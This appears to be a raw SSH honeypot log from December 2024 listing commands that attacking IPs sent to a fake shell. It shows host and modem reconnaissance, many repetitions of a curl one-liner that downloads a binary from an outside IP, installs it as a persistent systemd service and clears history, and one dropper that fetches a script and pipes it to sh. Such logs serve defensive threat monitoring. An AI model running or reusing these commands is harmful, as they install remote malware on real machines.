start
2024-12-10 01:56:09.394355 - ('122.33.164.234', 33627) - echo Hi | cat -n
2024-12-10 02:56:34.015738 - ('124.52.245.244', 44268) - /ip cloud print
2024-12-10 02:56:35.204703 - ('124.52.245.244', 44268) - ifconfig
2024-12-10 02:56:36.178674 - ('124.52.245.244', 44268) - uname -a
2024-12-10 02:56:37.147332 - ('124.52.245.244', 44268) - cat /proc/cpuinfo
2024-12-10 02:56:38.123109 - ('124.52.245.244', 44268) - ps | grep '[Mm]iner'
2024-12-10 02:56:39.087207 - ('124.52.245.244', 44268) - ps -ef | grep '[Mm]iner'
2024-12-10 02:56:40.056248 - ('124.52.245.244', 44268) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 02:56:41.027089 - ('124.52.245.244', 44268) - echo Hi | cat -n
2024-12-10 03:51:42.283940 - ('45.148.10.203', 51676) - apt
2024-12-10 03:51:43.902195 - ('45.148.10.203', 51676) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 03:51:52.438908 - ('45.148.10.203', 56684) - apt
2024-12-10 03:51:54.106209 - ('45.148.10.203', 56684) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:06.948105 - ('195.178.110.34', 58112) - apt
2024-12-10 04:41:08.141002 - ('195.178.110.34', 58112) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:15.495835 - ('195.178.110.34', 54800) - apt
2024-12-10 04:41:16.734440 - ('195.178.110.34', 54800) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:23.988830 - ('195.178.110.34', 44808) - apt
2024-12-10 04:41:25.195401 - ('195.178.110.34', 44808) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:32.467902 - ('195.178.110.34', 40272) - apt
2024-12-10 04:41:33.707980 - ('195.178.110.34', 40272) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:41.326188 - ('195.178.110.34', 40278) - apt
2024-12-10 04:41:42.595276 - ('195.178.110.34', 40278) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:49.973734 - ('195.178.110.34', 55422) - apt
2024-12-10 04:41:51.173632 - ('195.178.110.34', 55422) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:41:59.441994 - ('195.178.110.34', 36944) - apt
2024-12-10 04:42:01.008533 - ('195.178.110.34', 36944) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:08.220507 - ('195.178.110.34', 50116) - apt
2024-12-10 04:42:09.521026 - ('195.178.110.34', 50116) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:16.877806 - ('195.178.110.34', 35938) - apt
2024-12-10 04:42:18.065780 - ('195.178.110.34', 35938) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:26.146574 - ('195.178.110.34', 52600) - apt
2024-12-10 04:42:27.641423 - ('195.178.110.34', 52600) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:35.648938 - ('195.178.110.34', 46056) - apt
2024-12-10 04:42:37.209659 - ('195.178.110.34', 46056) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:44.312779 - ('195.178.110.34', 33654) - apt
2024-12-10 04:42:45.460623 - ('195.178.110.34', 33654) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:42:52.823934 - ('195.178.110.34', 44742) - apt
2024-12-10 04:42:54.169053 - ('195.178.110.34', 44742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:43:02.475806 - ('195.178.110.34', 44750) - apt
2024-12-10 04:43:04.102186 - ('195.178.110.34', 44750) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:43:11.127540 - ('195.178.110.34', 58788) - apt
2024-12-10 04:43:12.265703 - ('195.178.110.34', 58788) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 04:43:22.494972 - ('195.178.110.34', 33444) - apt
2024-12-10 04:43:23.692586 - ('195.178.110.34', 33444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 05:27:47.402802 - ('220.89.251.133', 47694) - /ip cloud print
2024-12-10 05:27:49.182933 - ('220.89.251.133', 47694) - ifconfig
2024-12-10 05:27:50.562705 - ('220.89.251.133', 47694) - uname -a
2024-12-10 05:27:51.948533 - ('220.89.251.133', 47694) - cat /proc/cpuinfo
2024-12-10 05:27:53.327578 - ('220.89.251.133', 47694) - ps | grep '[Mm]iner'
2024-12-10 05:27:54.713046 - ('220.89.251.133', 47694) - ps -ef | grep '[Mm]iner'
2024-12-10 05:27:56.093648 - ('220.89.251.133', 47694) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 05:27:57.472903 - ('220.89.251.133', 47694) - echo Hi | cat -n
2024-12-10 05:46:08.008985 - ('78.189.114.190', 36542) - /ip cloud print
2024-12-10 05:46:09.808785 - ('78.189.114.190', 36542) - ifconfig
2024-12-10 05:46:11.103167 - ('78.189.114.190', 36542) - uname -a
2024-12-10 05:46:12.425379 - ('78.189.114.190', 36542) - cat /proc/cpuinfo
2024-12-10 05:46:13.732297 - ('78.189.114.190', 36542) - ps | grep '[Mm]iner'
2024-12-10 05:46:15.062398 - ('78.189.114.190', 36542) - ps -ef | grep '[Mm]iner'
2024-12-10 05:46:16.372572 - ('78.189.114.190', 36542) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 05:46:17.674802 - ('78.189.114.190', 36542) - echo Hi | cat -n
2024-12-10 06:16:01.150344 - ('180.225.156.132', 57149) - /ip cloud print
2024-12-10 06:16:02.343861 - ('180.225.156.132', 57149) - ifconfig
2024-12-10 06:16:03.322425 - ('180.225.156.132', 57149) - uname -a
2024-12-10 06:16:04.310315 - ('180.225.156.132', 57149) - cat /proc/cpuinfo
2024-12-10 06:16:05.288280 - ('180.225.156.132', 57149) - ps | grep '[Mm]iner'
2024-12-10 06:16:06.259606 - ('180.225.156.132', 57149) - ps -ef | grep '[Mm]iner'
2024-12-10 06:16:07.226284 - ('180.225.156.132', 57149) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 06:16:08.186318 - ('180.225.156.132', 57149) - echo Hi | cat -n
2024-12-10 06:34:31.213987 - ('122.33.53.200', 58378) - /ip cloud print
2024-12-10 06:34:32.368809 - ('122.33.53.200', 58378) - ifconfig
2024-12-10 06:34:33.320145 - ('122.33.53.200', 58378) - uname -a
2024-12-10 06:34:34.266050 - ('122.33.53.200', 58378) - cat /proc/cpuinfo
2024-12-10 06:34:35.212850 - ('122.33.53.200', 58378) - ps | grep '[Mm]iner'
2024-12-10 06:34:36.157331 - ('122.33.53.200', 58378) - ps -ef | grep '[Mm]iner'
2024-12-10 06:34:37.101485 - ('122.33.53.200', 58378) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 06:34:38.048135 - ('122.33.53.200', 58378) - echo Hi | cat -n
2024-12-10 08:26:03.765784 - ('87.120.113.231', 42754) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-10 09:39:37.953143 - ('195.178.110.6', 53950) - apt
2024-12-10 09:39:39.972017 - ('195.178.110.6', 53950) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:39:49.156601 - ('195.178.110.6', 51268) - apt
2024-12-10 09:39:51.764413 - ('195.178.110.6', 51268) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:39:59.443401 - ('195.178.110.6', 53466) - apt
2024-12-10 09:40:01.036169 - ('195.178.110.6', 53466) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:40:08.974894 - ('195.178.110.6', 48946) - apt
2024-12-10 09:40:10.154346 - ('195.178.110.6', 48946) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:40:18.911848 - ('195.178.110.6', 57030) - apt
2024-12-10 09:40:20.420682 - ('195.178.110.6', 57030) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:40:29.727981 - ('195.178.110.6', 34090) - apt
2024-12-10 09:40:31.318591 - ('195.178.110.6', 34090) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:40:40.084471 - ('195.178.110.6', 34238) - apt
2024-12-10 09:40:41.279522 - ('195.178.110.6', 34238) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:40:51.152008 - ('195.178.110.6', 51214) - apt
2024-12-10 09:40:52.509271 - ('195.178.110.6', 51214) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:02.436232 - ('195.178.110.6', 38338) - apt
2024-12-10 09:41:04.082101 - ('195.178.110.6', 38338) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:14.543851 - ('195.178.110.6', 59566) - apt
2024-12-10 09:41:16.270043 - ('195.178.110.6', 59566) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:25.754987 - ('195.178.110.6', 34732) - apt
2024-12-10 09:41:27.227554 - ('195.178.110.6', 34732) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:36.341181 - ('195.178.110.6', 54472) - apt
2024-12-10 09:41:37.541132 - ('195.178.110.6', 54472) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:47.571874 - ('195.178.110.6', 46822) - apt
2024-12-10 09:41:48.913310 - ('195.178.110.6', 46822) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 09:41:59.103546 - ('195.178.110.6', 37082) - apt
